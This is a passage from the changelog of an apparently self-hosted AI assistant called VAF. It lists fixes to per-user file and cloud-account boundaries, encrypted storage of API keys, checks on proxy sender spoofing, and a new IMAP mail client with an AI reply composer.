  submitted line rewrote the entire learned-phrases file before anything else could
  happen - on a well-used install that is a 2.5 MB write and about a seventh of a
  second, paid in the terminal and in the web app alike. The learning is kept in
  memory immediately and written out a few seconds later, in the background, and
  the file is replaced atomically so an interrupted save cannot corrupt it.
- **A sub-agent no longer draws over the terminal app.** When the coding agent, the
  librarian or the research agent ran without their own window, each painted a live
  progress panel straight onto the terminal - which shredded the display of the new
  full-screen `vaf run`. All three now ask one shared question first, and while an
  application owns the screen they report their progress into the transcript instead
  of over it.
- **The terminal app no longer loses its model, its settings or its crash reports.**
  Five things went wrong quietly in the new full-screen `vaf run`: the desktop tray
  could unload the local model in the middle of a session, because the app never
  told it that a session was alive; a failing turn left no traceback anywhere; a
  theme picked in Settings only changed half the colors; the model name in the top
  bar always read "local"; the speech-input row could show "off" while the
  microphone was actually live; and switching server persistence did not reach the
  running agent. `vaf run` now also checks for Git before it starts, instead of
  letting tools fail deep inside an answer, and falls back to the previous
  interface if the full-screen one cannot start at all.
- **Files sent through the messengers are confined to your own data on shared
  machines.** Attaching a file to an outgoing Telegram, WhatsApp or Discord message
  (or to the main-messenger delivery) accepted any path the general safety checks
  allow - including another user's project tree. Only email attachments were
  confined. All senders now enter the same per-user boundary as the file tools, so
  a non-admin can only send files from their own tree.
- **A symbolic link can no longer smuggle a protected file into a file operation or
  an outgoing attachment.** The shared path rule checked the link's own location and
  the file was then opened at the link's target - so a link inside an allowed folder
  could reach VAF's credential store or system files. The rule now resolves links
  and re-checks the real target, for every caller.
- **Generated text no longer carries stream debris or hidden reasoning.** Several
  features collected the model's streamed answer with their own hand-written loops,
  and the loops disagreed: AI git commit messages could end in a raw
  `{"finish_reason": "stop"}` control frame, tool utility completions could return a
  provider ERROR message as if it were the answer, and on local reasoning models the
  coder's template detection and other short calls received empty text because the
  whole token budget went into hidden reasoning. All of these now share one collector
  that filters control frames, treats backend errors as "no answer", strips reasoning
  blocks, and disables reasoning for local utility calls.
- **Streamed memory answers work again.** Asking the memory panel a question with
  streaming on crashed on the very first token and returned an error string instead of
  the answer - every time, on every backend. The stream now delivers the text.
- **Attachment summaries respect their time budget.** The per-section summarizer
  declared a timeout that was never wired up, so a slow backend could stall document
  ingestion far beyond the budget the caller computed. The timeout now binds.
- **Settings no longer claims "API key missing" for a key that is safely stored.** Since
  keys moved into the encrypted store, the browser's copy of the config deliberately
  carries no key values - but six places in Settings still judged "is a key configured"
  from that copy: the warning banner in the provider section, the model-refresh buttons
  next to the provider, vision and voice-agent model pickers, and the three voice hints.
  A stored key therefore showed as missing, and refresh buttons stayed disabled although
  the server could resolve the key fine. All of them now ask the same stored-state the
  key fields already use, count a freshly typed key as present, and stay silent while the
  state is still loading or unreadable - "nothing configured" and "cannot tell" are
  different answers and no longer render as the same warning.
- **Editing an offline user no longer deactivates their account.** The user table showed
  "Active/Inactive" for presence - is the user connected right now - but the edit dialog
  read that same field as the account state and wrote it back on save. Editing anyone who
  happened to be offline and clicking Save silently blocked their sign-in, and a
  reactivation appeared not to stick because the list refresh dropped the mapped fields.
  Presence and account state are now two separate things everywhere, and the list refresh
  is one shared loader instead of four drifting copies. The user list also says
  "Online/Offline" for presence now, so it no longer borrows the words the account
  setting uses, and a deactivated account is marked as such right in the list.
- **An admin can no longer lock themselves - or everyone - out.** You cannot deactivate,
  demote or delete your own account (another admin can still do all three to you), and
  nobody can deactivate, demote or delete the last remaining admin who is able to sign
  in. Deleting was the gap: it only checked that some other admin account existed, even
  a deactivated one that could never log in to repair anything. The server refuses with a
  clear message, and the dialog does not offer the self-lockout controls in the first
  place.
- **A generated password is shown once instead of being thrown away.** Creating a user
  with the password field left empty is the advertised way to let VAF generate one - and
  the generated password was then discarded without ever being displayed, so the new
  account could not be used until an admin ran a separate password reset. It now appears
  in a confirmation dialog with a copy button, once, because it exists nowhere else.
- **Opening the user editor from the detail view no longer carries the previous user's
  state.** The access preset picked for the last user stayed selected and immediately
  rewrote the newly opened user's tool selection, and a temporary password from the
  previous user could appear in the new user's dialog.
- **The account status toggle says what it does.** It flips whether the user may sign
  in, but showed only a nameless switch. It now shows the state in words - Active or
  Deactivated - plus what each means, including the honest limit: deactivating blocks
  sign-in and token renewal immediately, while a session that is already signed in ends
  when its token expires.
- **The per-user access picker is searchable.** With 117 tools in the grid, finding the
  one to grant or revoke meant scrolling; both the tool and the workflow list now have a
  search field. Filtering is visual only - presets and "Select All" keep operating on
  the full list, so a filter can never silently shrink what they apply to.
- **The per-user tool permission is now actually enforced.** Since user management
  existed, an admin could choose which tools each user may use - and the choice was
  saved, displayed, and checked by nothing (the interface said so honestly). It is now
  enforced on every tool call: a user can only run the tools selected for their account,
  in chat and inside the coding agent, and a revocation takes effect within seconds, not
  at the next login. The coding agent's internal tools - the shell above all - now appear
  in the admin's picker as well, so "this user gets the coder but not the shell" is a
  choice the admin can express. Admins themselves are never restricted and an empty
  selection means unrestricted.
- **The per-user workflow permission is enforced as well.** The other half of the same
  admin choice - which saved workflows a user may run - was also stored and checked by
  nothing. A saved workflow now passes that list when it starts, wherever it is started
  from: chat, the workflow tool, an automation, the command line, or the resume of a
  paused run - so revoking a workflow while it is paused means it does not come back.
  The same rules apply as for tools: admins are never restricted, an empty selection
  means unrestricted. One-off workflows the agent designs on the fly have no saved
  identity to check; what governs them is the tool permission of the feature that
  builds them.
- **The coding agent now acts as the person who asked.** It runs as a separate process,
  and no identity crossed that boundary - so its file tools ran with the machine owner's
  rights for every caller. The caller's identity now travels with the task, and the
  coder's file tools are confined to that person's own workspace. The owner's own runs are
  unchanged, and the shell deliberately keeps full strength - controlling who may use the
  coder at all remains the admin's lever.
- **Each user's cloud accounts are their own.** Connected cloud storage - Google Drive,
  OneDrive, Dropbox, Nextcloud, iCloud - was addressed by user NAME, and any part of VAF
  that had no name to give fell back to the machine owner's. On a shared installation that
  meant another person's request could list, read and download from the owner's cloud
  accounts using the owner's own login. Credentials are now addressed by the account they
  belong to, end to end, including when a login token is refreshed. Existing connections
  keep working and move across by themselves the first time they are used; the owner's own
  accounts are unchanged. Cloud downloads follow the same rule: they used to land in the
  owner's Downloads folder no matter who asked, and now arrive in the requester's own
  space.
- **The OAuth client secrets get the same treatment as the API keys - and stop travelling
  to the browser too.** The Google, Microsoft, Dropbox and GitHub client secrets in
  Settings showed their stored value to any admin session and echoed it back on every
  save - the same mechanism that corrupted a stored API key. They are now write-only like
  the keys: the field shows a partial glimpse and locks until you choose to change it,
  deleting is its own confirmed action, and what never leaves the server cannot be echoed
  back into it. One consequence to know: clearing such a field and saving no longer
  removes the secret - the delete action does, deliberately.
- **A stored key field shows you which key it holds.** "Key stored" answers whether, not
  which - so each field with a stored key now shows a recognisable glimpse in grey: the
  first characters, a run of dots, the tail (like `vaf_live_q0``...``Ab4d`). It is a display
  built on the server and deliberately partial; the key itself still never travels to the
  browser, which is what keeps the save round-trip incapable of corrupting it.
- **Your API keys no longer travel to the browser at all - and a Settings save can no
  longer corrupt a stored key.** The Settings page used to receive the key values still
  sitting in the configuration file and showed them as dots; saving any setting then sent
  them back, and VAF stored that echo as if it were the key. For most keys the echo
  happened to be identical and nothing broke; for one whose on-disk form was encoded, the
  stored key was silently replaced by its encoded shell and every request with it would
  have been refused - found because one key field looked different from the others. Key
  fields now always arrive empty (the stored value is confirmed, never displayed), the
  save response no longer carries secrets to anyone, and the round trip is pinned by a
  test that replays it against the real save route.
- **"Fetch models" works again for a stored key.** It used to read the key from the form
  field, which is empty by design now; the server resolves the stored key itself, and the
  form only needs a value while you are typing a new one.
- **A new or changed API key is checked against the provider when you save it.** Until now
  a wrong key looked exactly like a right one until the next message failed, and the answer
  arrived as a chat error with nothing connecting it to the screen that caused it. Saving a
  key you entered or changed now asks the provider whether it works, and reports back next to
  that key. A refused key says so with the provider's own error number and is left in place
  for you to correct; VAF does not delete it, because a check is not a revocation. A provider
  that cannot be reached is reported as exactly that and never as a bad key - an outage or a
  rate limit says nothing about what you typed, and treating it as a verdict would send you
  chasing a key that was never the problem.
- **Settings no longer closes when you save.** Saving applies your changes; closing the
  window is your decision, with Escape or a click outside. They used to be the same action,
  which also meant a key check had nowhere to report to.
- **You can now actually delete an API key, and Settings shows you which keys are stored.**
  Clearing the field and saving did nothing: a blank value has always meant "the form did not
  re-send this", which is what stops a half-filled page from wiping a key, so there was no way
  at all to remove one. That matters more than it sounds, because the usual reason to delete a
  key is that it leaked - and the interface reported success while the key stayed live. Each
  key now has its own delete action, and it removes the key from both places it can be stored,
  in the order that matters: get it wrong and the next use quietly restores it from the older
  location. If any part of the removal fails, you are told the key is still live and should be
  rotated at the provider instead of being told it worked.
- **Settings tells you again which API keys are stored.** When keys moved out of the plain
  configuration file into the encrypted store, the key fields in Settings went blank and
  stayed blank - a configured, working key looked exactly like no key at all, on the one page
  where you go to check. Each field now says whether a key is stored, without ever showing the
  key itself, and says so honestly when the stored keys cannot be read rather than reporting
  "none".
- **Changing your API key now takes effect without restarting VAF.** Saving a new key
  appeared to work while the old one kept answering, and only a full restart applied the
  change - which meant a key you had just deleted or replaced could still be in use, with
  nothing on screen saying so. VAF runs several chat workers side by side, and the change
  was being applied to one of them; the rest carried on with the key they started with. It
  now reaches every one of them. Agents belonging to an application that embeds VAF are
  deliberately left alone, so a key passed in by that application is never replaced by the
  one on the machine.
- **The protection shield no longer reports "no anomalies" on a day something was
  blocked.** The shield summarised the state of each protection module but ignored what had
  actually happened that day, so a stopped high-risk skill installation and an admin
  overriding a security refusal appeared only as two small numbers in the Skills panel,
  next to a large green "no anomalies". Today's blocked attempts now appear at the shield
  itself as a clickable badge that opens the full list, and an overridden refusal or a
  worsened re-scan raises the shield to amber. A block on its own stays green with a count:
  a blocked attempt is the protection working, not a problem.
- **The security event list now names every kind of event.** Half of what VAF records -
  every skill event and both mail events - had no label anywhere in the interface and would
  have been shown as a raw internal identifier instead of a description.
- **A broken stored API key now says so instead of looking unconfigured.** Until now any
  problem reading a key produced an empty value, and an empty value means "not set up" to
  everything that asks - so a damaged key silently dropped you to the local model, or to no
  provider at all, with nothing to indicate why. It now reports the problem for the provider
  you are actually using, at the moment it is used: a damaged entry for a provider you never
  touch cannot take the installation down. If you see it, re-enter that key in Settings.
- **Your API keys move out of the plain configuration file.** They were stored in
  `config.json`, scrambled but not encrypted - readable to anyone who opened the file, and
  carried along in any backup or screenshot of it. They now live in the same encrypted store
  as your mail, GitHub and cloud logins. Existing keys keep working and move across by
  themselves the first time they are used; nothing is deleted, so going back to an older
  version still finds them. Worth being precise about what this buys: unless you set a master
  passphrase, the protection is still only your file permissions - the win is that the secret
  is no longer sitting in the file everything else reads.
- **Cloud storage no longer treats everyone as the machine owner.** The assistant's cloud
  tool worked out who was calling from a setting that is never actually set, so it always
  concluded it was the owner - whoever was really asking. On a shared installation that
  meant anyone could list, read, download and upload through the owner's connected Google
  Drive, OneDrive, Dropbox, Nextcloud and iCloud accounts, using the owner's stored logins.
  It now uses the identity of the actual caller. In a normal chat that means you see your
  own connected accounts and nobody else's. When the assistant reaches the tool through its
  file assistant, your name is not passed along yet, so you see nothing rather than someone
  else's accounts - safe, but not yet complete; the remaining half is in progress.
  Single-user installations are unaffected.
  In the same place, two file paths are no longer taken at face value: asking the tool to
  upload a local file, or to fetch one back out of the sync folder, is refused when the path
  points outside your own area instead of copying the file somewhere the assistant can serve
  it back.
- **A tool run without a username no longer guesses whose data it is.** Some runs carry no
  username - after switching into a chat that has none stored, from the command line, from a
  workflow started without one - and the assistant used to fill in the literal name "admin".
  On any installation where you registered under a different name, that named nobody: things
  stored under a name (your cloud accounts and their sync folder, your GitHub account,
  credentials in the lanes that have no scope) are filed under the name you registered with,
  so the same person could be recognised in the web interface and be a stranger with an empty
  account list one lane over. The missing name is now resolved from the user the run belongs
  to: your own runs get your account, and a run belonging to somebody else gets their own
  separate space instead of yours. Installations with a single user called "admin" behave
  exactly as before. Some traces of the old behaviour remain visible in an old credential key
  shape the store keeps reading, and in stored chat history filed under the literal name.
- **The macOS launcher works on any machine.** `launch_vaf.scpt` opened a hardcoded home
  directory belonging to one account, so it failed for everybody else. It now uses `$HOME`.
- **Examples in the assistant's own instructions no longer name one particular person.** The
  shipped prompt text used a real first name in its examples ("... said", "Tell ... to call me
  back"), which read oddly for anybody else and put a private name in a public repository.
  Examples, default display names and documentation now use neutral placeholders. A guard
  checks committed content for real home directories by shape, so the next one is caught
  before it is published rather than after.
- **Code search and the linter stayed inside your own files.** Both took a path and worked on
  it without asking whether it was yours. Code search looked contained - it clamps a path back
  into the project it was given - but that only applies to the copy the coding assistant uses;
  the one in normal chat is created without a project, so the clamp did nothing and an absolute
  path was searched and its matching lines returned. Both now confine to the calling user's
  own files, on every path they can be called from.
- **On a shared machine, one person could reach into another's chat session.** Three of the
  commands the browser sends act on a session named in the message itself, and they never
  checked that the session belonged to whoever sent it. The consequences differed: the
  attachment panel of another user's chat could be emptied or filled with someone else's
  documents, which they would then find there and could unknowingly teach to VAF; a voice call
  could place a task into another person's chat queue; and a Stop press could interrupt
  another person's running answer. All three now refuse to act on a session that is not
  yours, the same way the other commands already did.
- **Asking VAF to write a document can no longer put it outside your documents folder.**
  The tool takes a file NAME, but never checked that it got one: a name that was actually a
  path replaced the target folder entirely, so an absolute one wrote wherever it pointed. The
  file-type restriction did not help - it limits which formats may be written, not where. A
  name containing a path is now refused with a pointer to the tool that does take one, and
  the document lands in the calling user's own folder on a shared machine rather than
  wherever the name led.
- **Asking VAF to learn a document can no longer pull in files it protects.** This tool
  carried its own idea of which files were readable, and it disagreed with the one every
  other file tool uses in both directions: it allowed anything in your home folder, including
  SSH keys, `.env` files and VAF's own settings and credential store, while refusing ordinary
  files kept outside it. Learning is also the worst place for that to go
  wrong, because it keeps what it reads: the contents are summarised into long-term memory
  and stay searchable long after the conversation ends. The tool's private rule is gone and
  the shared one decides, which on a multi-user machine also applies the per-user boundary it
  previously skipped. Together with the document panel fix below, a protected file is now
  refused whether you ask to view it or to learn it.
- **Opening a protected file in the document panel no longer showed its contents.** The
  viewer read every file twice: once through the checked reader, and once raw to send the
  original bytes to the browser. Only the first read was checked, and its refusal was not
  acted on, so a file VAF protects for everyone - SSH keys, `.env` files, VAF's own settings
  and credential store - was refused in the text pane while the panel received the real file,
  and the tool reported it as opened. It is now one decision, taken before anything is read,
  and it covers both the protected locations and each user's own boundary.
  Its sibling, the document editor, now also reports honestly: it says it asked the
  interface to open a file, because whether the file is actually served is decided
  elsewhere and can still be refused. Claiming success for something that cannot
  happen is the same problem one level up.
- **The file assistant's own tools now follow the same rules as everything else - this time
  on both of its paths.** When you ask VAF to work with your files, it hands the job to an
  assistant that runs its own small agent, and that agent called its thirteen tools directly,
  bypassing the checks every other tool call goes through. An earlier entry said this was
  fixed; it was fixed for one of the assistant's two paths. The other one answers simple
  requests straight from the wording, without ever starting the inner agent - "how big is this
  folder", "rename this to that", "show me the structure" - and it kept calling five tools
  directly, including the one that moves files.
  Both paths go through the shared checks now, which also means that for the first time these
  actions appear in the activity log: previously the assistant could rename or write a file
  and leave no record of it anywhere. Your files were never less protected on that path - the
  per-user boundary applied throughout - but nothing recorded what happened.
  One thing reads differently as a result: when one of those actions fails, the message is now
  the same short one used everywhere else instead of a hand-written sentence, so the assistant
  says what it is about to do beforehand ("Renaming X to Y...") to keep the context.
- **A failed web search could answer with someone else's memories.** When every web provider
  is unavailable, VAF falls back to your own long-term memory - but on a server running
  several conversations at once, it picked whose memory to read from a process-wide value
  that any of them could have overwritten a moment earlier. The answer could therefore come
  from another person's memories. The tool is now told who is asking, the same way every
  other per-user tool already was. Single-user installations were never affected, and a
  request with no user attached was already refused rather than answered broadly.

## [0.1.0a19] - 2026-07-27

### Added
- **Workflows can now run as the person who started them.** Until now a saved workflow always
  acted as the machine owner, no matter who ran it - so anything it did with memory, mail,
  messages, the calendar or contacts was filed under the owner's account. The new setting
  `workflow_identity_injection` switches this over: leave it at `legacy` for the previous
  behaviour, set it to `declared` to have workflows carry the identity of whoever started
  them. Off by default, because it changes where a running workflow's data goes.
- **You can now choose who a skill is for.** The skill editor has a visibility setting -
  everyone, only you, or named people - the same one custom tools already had. It decides who
  sees the skill and who can use it, and now also whose agent may open the files bundled with
  it. Existing skills keep the setting they have; a new one starts as visible to everyone.
- **Tools you write yourself can now be told who is calling them.** VAF only handed the
  current user's identity to its own built-in tools, which meant a tool added through the
  framework could not tell one person from another - and the documentation could only warn
  about it. A tool now states what it needs and receives exactly that, whether it ships with
  VAF or you wrote it. Nothing changes for existing tools.
- A completely new built-in mail client, and it is now the only one
  (design doc `docs/integrations/EMAIL_CLIENT.md`). VAF has a real mail engine:
  a per-user local mail store (SQLite with full-text search over
  subject/sender/recipients/BODY, threaded conversations, encrypted-at-rest
  cached bodies, configurable retention with headers kept forever) and an
  RFC 4549 incremental IMAP sync engine (UID-based, UIDVALIDITY-safe, batched
  fetches, IMAP IDLE push on the inbox plus periodic sweeps, native Gmail
  thread/label handling). The mail window is a three-pane client: folder sidebar
  with unread counts and collapsible labels, conversation view, HTML mail
  rendered sanitized in a sandboxed frame with remote images blocked by default
  for tracking protection, attachment download, and search over message bodies.
  Mail opens offline from the local store. New permissive-licensed dependencies
  (in the `mail` extra): IMAPClient (BSD-3-Clause), nh3 (MIT),
  zstandard (BSD-3-Clause), listed in `THIRD_PARTY.md` and the About tab's
  third-party license list.
- Mail can be acted on, not just read: read/unread, star, archive and trash in
  the mail window (trash-only delete semantics, nothing is ever expunged),
  reply/reply-all/forward with proper quoting and threading, compose with a
  15-second undo window (the mail is held locally and can be withdrawn before it
  leaves the machine), and automatic filing of sent mail into the Sent folder.
  Changes apply locally first and replay to the mail server through a durable
  operation queue once `mail_engine_write_enabled` is on. The agent gains
  `reply_mail`, `forward_mail`, `archive_mail` and `delete_mail` tools (all
  excluded from the front-office contact lane by design).
- Outgoing mail is sent natively over SMTP (password or OAuth XOAUTH2), so it no
  longer depends on the provider REST APIs; an ambiguous failure after the message
  is handed to the server is parked, never re-sent, so a mail is never delivered
  twice. IMAP/SMTP server presets added for GMX, web.de, T-Online and outlook.de
  addresses.
- Blocked remote images in mail can now be loaded on explicit opt-in through
  a privacy proxy: the sender's server never sees the reader's address, SVG
  and non-image responses are refused, and refused hosts are logged to the
  security event log.
- The mail client warns about suspicious (possible phishing) messages: the
  conversation list shows a warning badge and the reader a warning banner on mails
  the agent's phishing filter would hide, so nothing dangerous is silently
  surfaced only to the human.
- The mail client shows which mail has already been answered: a reply marker with
  the date in the reader and a marker on answered conversations in the list, so a
  reply is not accidentally sent twice.
- Gmail-style categories: a category chip on Promotions/Social conversations and a
  relabel picker in the reader. Relabeling also teaches the category - VAF
  remembers a rule for that sender and labels every other mail from them, past and
  future. All of it is local; nothing is changed on the mail server.
- Mail Composer: the compose window can now write the reply for you, or rewrite
  what you typed. The window is wider now, with the message on the left and the
  Composer beside it on the right: a chat where you say what the reply should say,
  ask for changes ("shorter", "now more formal") and it refines what it just wrote,
  with Stop while it writes and an Undo that restores your text exactly. Draft and
  Rewrite sit in the footer next to Send. It puts a suggestion in the text field and stops there, so nothing is
  ever sent without you reading it and pressing Send, and it tells you how much of
  the conversation it actually read. It refuses to draft from a message flagged as
  possible phishing, and it can use what VAF remembers about you when you say what
  the reply should be about. New: a light-mode button in compose, so you can read
  the draft the way the recipient will. Admins can turn all of it off or change how
  much of a thread it reads (`mail_composer_*` settings). If the local model is not
  running yet, it is started for you instead of asking you to do it, with a note
  while it loads. Admins can additionally allow the Composer to quote older mail
  from other conversations (`mail_composer_mailbox_search_enabled`, off by default).
  The Composer knows what VAF remembers about you the same way the chat does, every
  time rather than only when you phrase a request a certain way, and it now writes a
  complete message (greeting, the point, a closing) in the language of the mail it is
  answering instead of a single bare sentence. It also tells apart which messages in
  a conversation you wrote and which the other person wrote, and writes in YOUR tone
  by following how you replied earlier in the same thread; if there is nothing of
  yours to go by it says so and stays neutral instead of inventing a style.
- The mail window's gear opens a built-in account panel: see your mail accounts,
  connect a new Gmail/Microsoft or IMAP account (with a Test button), reconnect,
  verify a connection, rename an account, toggle auto-sync, and remove an account.
  Removing an account that also powers your Calendar keeps it connected for
  Calendar.
- Library embedders can now set the agent's persona directly:
  `Agent(system_prompt="...")` replaces the on-disk "Soul" in the system prompt
  for that instance only, while the engine's technical instructions are kept.
  Previously the persona was a global on-disk file with no public API.
  Documented in EMBEDDING.md with a runnable example (examples/06_custom_persona.py).
- EMBEDDING.md now has a "Sub-agents as a library" section explaining that
  sub-agents run inline in a bare library process, while their windowed/async
  modes and the coder's sandbox need the full product's services.
- The skill scanner module gained a dependency-free content-hashing facility
  (SHA-2 and SHA-3): `hash_bytes` / `hash_text` and a deterministic,
  tamper-evident `hash_skill_folder` fingerprint, on a strong-only algorithm
  allow-list. Available for later integrity checks; not yet wired into the
  scan result.

### Changed
- The wording around mail image loading was corrected in the documentation. It
  protects the reader's browser identity (no cookies, referrer or browser
  fingerprint reach the sender) but it does NOT hide the reader's IP address, and
  it does not stop open-tracking: a tracking pixel's address is unique per
  recipient, so loading it still tells the sender the message was opened and when.
  Blocking images by default is the protection. `docs/integrations/EMAIL_CLIENT.md`
  now states both halves for privacy reviews.
- Server-side mailbox changes (read/unread, archive and delete replayed to the
  mail server) stay behind `mail_engine_write_enabled`, still off by default. Note
  that SENDING is deliberately NOT gated by it: a queued mail must be able to
  leave, so the agent's `reply_mail` and `forward_mail` verbs are live regardless
  (each still passes the high-risk send gate).
- Removed the dead Apple OAuth lane (provider entry, config keys
  `email_oauth_apple_client_id`/`_secret`, admin settings inputs and their
  locale strings, a dead sign-in URL branch in the setup wizard): Apple
  offers no OAuth mail API. iCloud Mail continues to connect via IMAP with
  an app-specific password, unchanged.

### Removed
- The `batch` tool is gone. It was listed as a Coder tool but could never be called: it was
  not registered for the main agent and not part of the Coder's tool set either. What it
  offered - running several tools at once - is what the agent already does in a single turn.
- The old mail dashboard and the separate email setup wizard are gone. Everything
  they did is in the mail window: reading mail, and the account panel behind its
  gear for connecting, reconnecting, testing, renaming, auto-sync and removing
  accounts (including the IMAP and SMTP server overrides the wizard offered, and
  the same hiding of sign-in buttons for providers an admin has not configured).
  The Overview security page reads its mail data from the new engine now.
- The old mail REST endpoints under `/api/email` are gone (message list, search,
  body, categories, category change, sender-rule backfill and the per-account
  sync). Mail is served from `/api/mail`. Sign-in and account management under
  `/api/email` are unchanged, because Calendar and the Connections page use them.
- The 30-minute background mail sync was removed. The mail engine's own sync
  (continuous, with push updates) is now the only one, so every mailbox was being
  fetched twice.
- The old mail transport (its own IMAP, Gmail API and Microsoft Graph paths for
  fetching, reading and sending) is gone; the mail engine handles all of it. An
  account that has not been connected for the engine can no longer send through the
  old path - it is refused with a message telling you to reconnect it, rather than
  failing quietly.
- The `mail_engine_v2_enabled` setting is gone. The mail engine is simply how mail
  works now, so there is nothing left to switch. `mail_engine_write_enabled` is
  unchanged and still off by default: it remains the separate switch for changes
  written back to the mail server (read/unread, archive, delete).
- Mail: with several accounts, only the first one kept its labels and "answered"
  markers when moving to the new mail engine. Every account now carries its own
  over, including labels belonging to mail that only arrives on a later sync, and
  it also happens when you sync manually rather than waiting for the background
  sync.
- Mail: adding an account with a password for an address that is already connected
  through sign-in is now refused with an explanation, instead of silently replacing
  the connection and disconnecting that account's calendar.
- The Logs page no longer dead-ends when debug logging is off. Three fixes
  from a live incident on a macOS install where a legacy config had
  `debug_logs_enabled: false`: the chain badge no longer claims "Chain
  intact" for an empty or missing timeline (an empty chain is vacuously
  intact; it now shows a neutral "No data yet" state), the timeline empty
  state is localized instead of hardcoded English, and the Debug Logs
  switch is back in Settings → Advanced - the empty states tell the user to
  enable it, so the switch has to exist in the UI.
- Corrected stale embedder docs: the FAQ said VAF was "not yet on PyPI" (it is,
  as a prerelease) and three docs claimed "no async API" despite the shipped
  `run_async`.

### Fixed
- **A tool the agent had just written for itself only worked after a restart.** When the
  agent creates a new tool, it is supposed to become usable straight away in the same
  conversation. The step that makes it live was never actually reached, so the tool was
  written correctly but stayed invisible until VAF was restarted next. It now appears
  immediately, as intended.
- **Mail did not work at all on some Windows and macOS installations.** The search index
  used a feature that needs a recent SQLite, and it was created together with the rest of
  the mail database - so on an older SQLite the whole mail store failed to be created, not
  just search. Affected setups running Python 3.10, which still ships an older SQLite on
  those two systems. The index now checks what the system supports and falls back to a form
  that works everywhere; searching, sorting by relevance and deleting behave the same, the
  index just takes a little more disk space there.
- **A workflow could open a skill somebody kept private.** Skills have a visibility setting,
  and in chat the agent respects it: a skill shared only with certain people stays closed to
  everyone else. A workflow step, however, was never told who had started it, so it acted as
  if an administrator were asking and could read any skill on the machine. Workflow steps now
  carry the identity of the person who started them. This closes the case for workflows you
  run from chat, for automations, and for a resumed workflow; saved workflows started from the
  library are covered by a broader fix still in progress.
- **The per-user tool and workflow selection said more than it does.** When creating or
  editing a user you can pick which tools and workflows they should have, and the wording read
  as though the choice were already in force. It is stored but not yet checked while the agent
  runs, so "Read-only" did not actually stop anything. The dialog now says so plainly instead
  of implying a restriction that is not there yet. The selection itself is unchanged and is
  kept for when it takes effect.
- **The "Add MCP server" dialog needed scrolling to reach its last field.** Test connection
  moved down next to Cancel and Save instead of occupying a row of its own, the empty band
  it left behind is gone, and the dialog is taller.
- **The failover setting looked navy in dark mode.** Its slider track and the step markers
  now use the same neutral tone as the other controls.
- **The agent could read files belonging to other people using the same VAF.** Writing was
  already confined to your own project folder, but reading was not, so the agent could open -
  or simply list - files in someone else's folder or elsewhere on the machine. Reading is now
  confined the same way. It is deliberately a little wider than writing: skills shared with
  you stay readable, because a skill may point the agent at its own reference files. A skill
  somebody kept private is not, which it previously was. Your own files, your uploads, and
  everything an administrator does are unaffected.
- **The local model stayed on your graphics card after switching to a cloud provider.** VAF
  already frees it in that situation, but two rules were holding it back for users who could
  never benefit from it. Background thinking asked to keep the model without checking that
  the next thinking run would run in the cloud and never touch it - and it asked that not
  only while a run was in progress but also while one was merely due, which stays true for as
  long as you are away. Separately, a setup with a local voice model reserved it whenever a
  VAF window was open, although a call loads what it needs when it starts. Roughly 3.4 GB now
  comes free on a provider switch. A call, a running task or a sub-agent still keeps the
  model; only the first call after an idle period waits briefly for it to load, which the
  call window already shows and handles.
- **Changing your API key only took effect after a restart.** Switching provider or key is
  handled in one place inside VAF, but the three parts that receive a settings change had
  each rebuilt that step by hand and each left pieces out. A key change with the provider
  unchanged was ignored entirely; VAF could keep telling the model, and the logs, that it
  was still the previous one; and if the new provider could not be reached, VAF could be
  left with no working model at all until you restarted, instead of simply staying on the
  one that was working. All three now go through the same implementation.
- **One of the agent's two ways to change a file skipped the per-user boundary.** When
  several people use one VAF, each is confined to their own project folder. Asking the
  agent to rewrite a file respected that; asking it to change a few lines in a file did
  not, so a file belonging to someone else could be altered, and a failed attempt even
  returned a few lines of that file. Both ways now enforce the same boundary. Nothing
  changes for a single-user VAF, for administrators, or for files of your own.
- **The agent could open VAF's own settings folder, where the keys live.** Asking the agent to
  read a file gave it access to the folder VAF stores itself in - the file holding every
  connected API key and the sign-in secret, saved copies of it, stored browser logins, voice
  profiles and every conversation. A key read out of there keeps working outside VAF and
  cannot be taken back, so the folder is now closed to the file tools for everyone, the owner
  of the machine included. Skills and workflows you create still live there and stay readable.
- **A second administrator was treated as an ordinary user by the file tools.** VAF lets you
  create more than one administrator, and they can do everything an administrator does -
  manage users, see every conversation, read the full settings. But when they asked the agent
  to work with a file, or opened a file from a chat, VAF checked only whether they were the
  very first administrator account and otherwise confined them to their own project folder.
  Administrators are now recognised as administrators everywhere. Nobody else gains access:
  ordinary users stay confined to their own files exactly as before.
- **A single device could lock everyone else out of signing in.** VAF blocks an address after
  repeated failed logins, but behind the built-in HTTPS proxy every device on the network
  counted as the same one. Five wrong passwords from anywhere blocked everybody for the next
  quarter of an hour, and the block could not be traced to whoever caused it. Attempts are now
  counted per device.
- **Conveniences meant for the computer VAF runs on reached the whole network.** Signing in at
  the machine itself gives a long-lived session, and an administrator there does not have to
  re-enter a two-factor code when the session refreshes - both because the person is physically
  at the keyboard. Behind the proxy every device on the network looked like the machine itself
  and received the same treatment. VAF now recognises which device is really the local one; the
  computer you run VAF on keeps both conveniences unchanged.
- **Your login history and the security log showed every device as the local computer.** Sessions
  and failed attempts from the network were recorded as coming from VAF's own machine, so it was
  impossible to see where a login had actually come from. Both now show the real device.
- **Devices on your network could reach VAF without logging in.** When network access was
  switched on, VAF's built-in HTTPS proxy passed every device to the backend as if it were
  the computer itself, so any device on the same network could open pages and APIs without
  a token, and even an expired or wrong token was let through. That included user
  management, the log viewer and the security dashboard. VAF now recognises which device a
  request really came from and asks anyone who is not on this computer to sign in.
  Signing in on another device, the desktop app, and first-time setup all keep working
  exactly as before. **After updating, restart VAF so the fix takes effect.**
- **A device on your network could pretend to be this computer.** The proxy added its own
  sender information alongside whatever a device had claimed, and the backend read the
  claimed value first. A device could therefore present itself as local and skip the check
  that ties a connected account (for example Gmail or a cloud drive) to the person who
  started the connection. The proxy now removes any claimed sender information before
  adding its own.
- Mail: an account the new mail engine does not sync yet (a Gmail or Microsoft
  account that has not completed the IMAP sign-in) is no longer reported as an
  empty mailbox. It stays visible in the mail client with a hint that it needs to
  be reconnected, instead of silently disappearing from the account list and
  reading as deleted.
- Mail: turning a per-account "Auto-sync" toggle off now actually stops that
  account from being polled by the new engine. It previously kept syncing (in fact
  more often than before), so the switch did the opposite of what it said.
- Mail: removing an account from Mail while keeping it connected for Calendar no
  longer resurrects itself - the background sync used to re-import the messages the
  removal had just deleted.
- Mail: Gmail's category tabs (Promotions, Social, Updates, Forums) are detected
  again. They are saved searches rather than labels, so reading them from the
  message labels never worked and every mail was filed as Primary; the category is
  now resolved through Gmail's own search over IMAP.
